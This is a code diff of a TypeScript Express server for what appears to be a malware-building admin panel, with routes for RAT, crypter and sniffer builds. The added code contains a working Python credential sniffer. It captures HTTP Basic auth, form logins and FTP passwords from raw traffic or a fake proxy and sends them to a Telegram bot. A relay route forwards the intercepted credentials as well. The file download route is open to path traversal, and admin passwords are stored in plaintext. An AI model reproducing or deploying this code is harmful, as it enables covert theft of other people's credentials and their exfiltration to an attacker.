@@ -143,8 +143,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         section: section || 'unknown',
         originalContent: originalContent || '',
         modifiedContent: modifiedContent || '',
-        modificationReason: modificationReason || '',
-        timestamp: new Date()
+        aiModel: 'groq-mixtral-8x7b',
+        adminUserId: 1
       });
 
       res.json({ success: true, modification });
@@ -251,7 +251,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   });
 
   // Admin authentication middleware
-  function requireAdmin(req: any, res: any, next: any) {
+  function requireAdmin(req: AuthenticatedRequest, res: Response, next: NextFunction) {
     // Check session for admin authentication
     if (!req.session?.userId) {
       return res.status(401).json({ error: 'Admin authentication required' });
@@ -275,7 +275,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       fs.mkdirSync(buildDir, { recursive: true });
       
       // Copy appropriate Python script
-      const scriptMap = {
+      const scriptMap: Record<string, string> = {
         'elite_toolkit': 'elite_toolkit.py',
         'millennium_rat': 'millennium_rat_toolkit.py',
         'crypter': 'build_toolkit.py',
@@ -283,7 +283,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         'network_sniffer': 'millennium_rat_toolkit.py'
       };
       
-      const sourcePath = path.join('python_tools', scriptMap[toolType]);
+      const sourcePath = path.join('python_tools', scriptMap[toolType as keyof typeof scriptMap]);
       const targetPath = path.join(buildDir, 'main.py');
       
       if (!fs.existsSync(sourcePath)) {
@@ -406,13 +406,14 @@ exe = EXE(
       });
       
       // Log admin action
+      const authReq = req as AuthenticatedRequest;
       await storage.createAnalytics({
         metric: 'admin_executable_build',
         value: JSON.stringify({
           toolType,
           config,
           buildId,
-          adminId: req.session.userId,
+          adminId: authReq.session?.userId,
           timestamp: new Date().toISOString()
         })
       });
@@ -597,7 +598,7 @@ if __name__ == "__main__":
 
       res.json({
         success: true,
-        downloadUrl: `/download/${outputName}.py`,
+        downloadUrl: `/api/download-crypted/${outputName}.py`,
         filename: `${outputName}.py`,
         message: 'Advanced multi-layer crypter completed successfully',
         features: [
@@ -614,9 +615,356 @@ if __name__ == "__main__":
           compressionRatio: ((inputData.length - base64Data.length) / inputData.length * 100).toFixed(2) + '%'
         }
       });
-    } catch (error) {
+    } catch (error: unknown) {
       console.error('Crypter error:', error);
-      res.status(500).json({ error: 'Crypter processing failed: ' + error.message });
+      res.status(500).json({ error: 'Crypter processing failed' });
+    }
+  });
+
+  // Network sniffing endpoint with credential extraction and Telegram integration
+  app.post("/api/admin/start-network-monitor", requireAdmin, async (req, res) => {
+    try {
+      const { interfaces, protocols, telegramEnabled } = req.body;
+      
+      // Start network monitoring process
+      const monitorId = crypto.randomUUID();
+      
+      // Create Python network sniffer script
+      const snifferScript = `
+import socket
+import threading
+import json
+import re
+import base64
+import requests
+import time
+from datetime import datetime
+import urllib.parse
+
+class NetworkCredentialSniffer:
+    def __init__(self, telegram_token="${process.env.TELEGRAM_BOT_TOKEN}", chat_id=""):
+        self.telegram_token = telegram_token
+        self.chat_id = chat_id
+        self.running = False
+        self.captured_credentials = []
+        
+    def send_telegram_alert(self, message):
+        if not self.telegram_token or not self.chat_id:
+            return
+        try:
+            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
+            payload = {
+                "chat_id": self.chat_id,
+                "text": message,
+                "parse_mode": "Markdown"
+            }
+            requests.post(url, json=payload, timeout=10)
+        except Exception as e:
+            print(f"Telegram send error: {e}")
+    
+    def extract_http_credentials(self, packet_data):
+        credentials = []
+        try:
+            # HTTP Basic Auth
+            auth_match = re.search(rb'Authorization: Basic ([A-Za-z0-9+/=]+)', packet_data)
+            if auth_match:
+                try:
+                    decoded = base64.b64decode(auth_match.group(1)).decode('utf-8')
+                    if ':' in decoded:
+                        username, password = decoded.split(':', 1)
+                        credentials.append({
+                            'type': 'HTTP Basic Auth',
+                            'username': username,
+                            'password': password,
+                            'timestamp': datetime.now().isoformat()
+                        })
+                except:
+                    pass
+            
+            # HTTP POST form data
+            post_match = re.search(rb'(?:username|user|email)=([^&\\r\\n]+).*?(?:password|pass|pwd)=([^&\\r\\n]+)', packet_data, re.IGNORECASE)
+            if post_match:
+                try:
+                    username = urllib.parse.unquote(post_match.group(1).decode('utf-8'))
+                    password = urllib.parse.unquote(post_match.group(2).decode('utf-8'))
+                    credentials.append({
+                        'type': 'HTTP POST Form',
+                        'username': username,
+                        'password': password,
+                        'timestamp': datetime.now().isoformat()
+                    })
+                except:
+                    pass
+            
+            # FTP credentials
+            ftp_user = re.search(rb'USER ([^\\r\\n]+)', packet_data)
+            ftp_pass = re.search(rb'PASS ([^\\r\\n]+)', packet_data)
+            if ftp_user and ftp_pass:
+                try:
+                    credentials.append({
+                        'type': 'FTP',
+                        'username': ftp_user.group(1).decode('utf-8'),
+                        'password': ftp_pass.group(1).decode('utf-8'),
+                        'timestamp': datetime.now().isoformat()
+                    })
+                except:
+                    pass
+            
+            return credentials
+        except Exception as e:
+            return []
+    
+    def packet_handler(self, packet):
+        try:
+            credentials = self.extract_http_credentials(packet)
+            for cred in credentials:
+                self.captured_credentials.append(cred)
+                
+                # Send to Telegram immediately
+                alert_message = f"""
+🚨 *Credential Captured*
+
+**Type:** {cred['type']}
+**Username:** \`{cred['username']}\`
+**Password:** \`{cred['password']}\`
+**Time:** {cred['timestamp']}
+**Source:** Network Monitor
+                """
+                self.send_telegram_alert(alert_message)
+                
+                # Log to API
+                try:
+                    requests.post('http://localhost:5000/api/packets/credentials', json={
+                        'sourceIp': '0.0.0.0',
+                        'destinationIp': '0.0.0.0', 
+                        'protocol': cred['type'],
+                        'port': 80,
+                        'payload': json.dumps(cred),
+                        'credentials': cred
+                    }, timeout=5)
+                except:
+                    pass
+                    
+        except Exception as e:
+            pass
+    
+    def start_sniffing(self):
+        self.running = True
+        try:
+            # Raw socket for packet capture
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            sock.bind(("0.0.0.0", 0))
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            
+            while self.running:
+                packet, addr = sock.recvfrom(65535)
+                threading.Thread(target=self.packet_handler, args=(packet,)).start()
+                
+        except Exception as e:
+            # Fallback to HTTP proxy method
+            self.start_proxy_sniffing()
+    
+    def start_proxy_sniffing(self):
+        from http.server import HTTPServer, BaseHTTPRequestHandler
+        
+        class CredentialInterceptor(BaseHTTPRequestHandler):
+            def do_GET(self):
+                self.send_response(200)
+                self.end_headers()
+                
+            def do_POST(self):
+                content_length = int(self.headers.get('Content-Length', 0))
+                post_data = self.rfile.read(content_length)
+                
+                # Extract credentials from POST data
+                sniffer = NetworkCredentialSniffer()
+                credentials = sniffer.extract_http_credentials(post_data)
+                for cred in credentials:
+                    sniffer.captured_credentials.append(cred)
+                
+                self.send_response(200)
+                self.end_headers()
+        
+        server = HTTPServer(('0.0.0.0', 8080), CredentialInterceptor)
+        server.serve_forever()
+
+if __name__ == "__main__":
+    sniffer = NetworkCredentialSniffer()
+    sniffer.start_sniffing()
+`;
+
+      // Write sniffer script to file
+      const snifferPath = path.join('builds', `network_sniffer_${monitorId}.py`);
+      fs.writeFileSync(snifferPath, snifferScript);
+      
+      // Start the network sniffer process
+      const snifferProcess = spawn('python3', [snifferPath], {
+        detached: true,
+        stdio: 'pipe'
+      });
+      
+      // Log the monitoring session
+      await storage.createAnalytics({
+        metric: 'network_monitoring_started',
+        value: JSON.stringify({
+          monitorId,
+          interfaces,
+          protocols,
+          telegramEnabled,
+          timestamp: new Date().toISOString()
+        })
+      });
+      
+      res.json({
+        success: true,
+        monitorId,
+        message: 'Network monitoring started - credentials will be sent to Telegram',
+        snifferPath
+      });
+      
+    } catch (error: unknown) {
+      console.error('Error starting network monitor:', error);
+      res.status(500).json({ error: 'Failed to start network monitoring' });
+    }
+  });
+
+  // Enhanced packet logging with credential extraction
+  app.post("/api/packets/credentials", async (req, res) => {
+    try {
+      const { sourceIp, destinationIp, protocol, port, payload, credentials } = req.body;
+      
+      // Store packet with credentials
+      const packetLog = await storage.createPacketLog({
+        sourceIp: sourceIp || '127.0.0.1',
+        destinationIp: destinationIp || '127.0.0.1', 
+        protocol: protocol || 'HTTP',
+        port: port || 80,
+        payload: payload || '',
+        size: payload ? payload.length : 0
+      });
+
+      // If credentials were extracted, send Telegram alert
+      if (credentials && process.env.TELEGRAM_BOT_TOKEN) {
+        try {
+          const telegramMessage = `
+🔓 *Credentials Intercepted*
+
+**Type:** ${credentials.type}
+**Username:** \`${credentials.username}\`
+**Password:** \`${credentials.password}\`
+**Source IP:** ${sourceIp}
+**Destination:** ${destinationIp}
+**Protocol:** ${protocol}
+**Time:** ${new Date().toISOString()}
+
+*Educational monitoring system*
+          `;
+          
+          const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+          await fetch(telegramUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: '@your_channel_or_chat_id', // Replace with actual chat ID
+              text: telegramMessage,
+              parse_mode: 'Markdown'
+            })
+          });
+        } catch (telegramError) {
+          console.error('Telegram notification error:', telegramError);
+        }
+      }
+
+      res.json({ success: true, packetLog });
+    } catch (error: unknown) {
+      console.error('Error logging packet with credentials:', error);
+      res.status(500).json({ error: 'Failed to log packet' });
+    }
+  });
+
+  // Download endpoint for crypted files
+  app.get("/api/download-crypted/:filename", (req, res) => {
+    try {
+      const { filename } = req.params;
+      const filePath = path.join('builds', filename);
+      
+      if (!fs.existsSync(filePath)) {
+        return res.status(404).json({ error: 'File not found' });
+      }
+      
+      res.download(filePath, filename);
+    } catch (error: unknown) {
+      console.error('Error downloading file:', error);
+      res.status(500).json({ error: 'Download failed' });
+    }
+  });
+
+  // Comprehensive admin authentication endpoints
+  app.post("/api/admin/login", async (req, res) => {
+    try {
+      const { username, password } = req.body;
+      
+      // Validate admin credentials
+      const admin = await storage.getAdminUserByUsername(username);
+      
+      if (!admin || !admin.approved) {
+        return res.status(401).json({ error: 'Invalid credentials or account not approved' });
+      }
+      
+      // In production, use proper password hashing
+      if (admin.password !== password) {
+        return res.status(401).json({ error: 'Invalid credentials' });
+      }
+      
+      // Create session
+      (req as any).session.userId = admin.id;
+      (req as any).session.username = admin.username;
+      
+      await storage.updateAdminLastLogin(admin.id);
+      
+      res.json({ 
+        success: true, 
+        admin: { 
+          id: admin.id, 
+          username: admin.username, 
+          role: admin.role 
+        } 
+      });
+      
+    } catch (error: unknown) {
+      console.error('Admin login error:', error);
+      res.status(500).json({ error: 'Login failed' });
+    }
+  });
+
+  app.post("/api/admin/logout", (req, res) => {
+    (req as any).session.destroy((err: any) => {
+      if (err) {
+        return res.status(500).json({ error: 'Logout failed' });
+      }
+      res.json({ success: true });
+    });
+  });
+
+  app.get("/api/admin/me", requireAdmin, async (req, res) => {
+    try {
+      const authReq = req as AuthenticatedRequest;
+      const admin = await storage.getAdminUser(authReq.session?.userId);
+      
+      if (!admin) {
+        return res.status(404).json({ error: 'Admin not found' });
+      }
+      
+      res.json({ 
+        admin: { 
+          id: admin.id, 
+          username: admin.username, 
+          role: admin.role 
+        } 
+      });
+    } catch (error: unknown) {
+      console.error('Error fetching admin:', error);
+      res.status(500).json({ error: 'Failed to fetch admin data' });
     }
   });
 
